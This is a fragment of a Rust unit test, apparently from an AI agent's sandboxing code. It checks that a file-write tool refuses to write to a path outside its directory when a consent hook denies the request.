            Some(cfg),
            Some(std::sync::Arc::new(DenyConsentHook)),
            Some(std::sync::Arc::new(rc_sandbox::guard_hook::SessionGuardMemo::default())),
        );
        let result = WriteFileTool
            .run(json!({"path": "../deny.txt", "content": "x"}), &ctx)
            .await;
        assert!(!result.ok, "{}", result.output);
        assert!(result.output.contains("guard denied"), "{}", result.output);
        assert!(!dir.path().join("deny.txt").exists(), "denied gate must not write");
    }
}
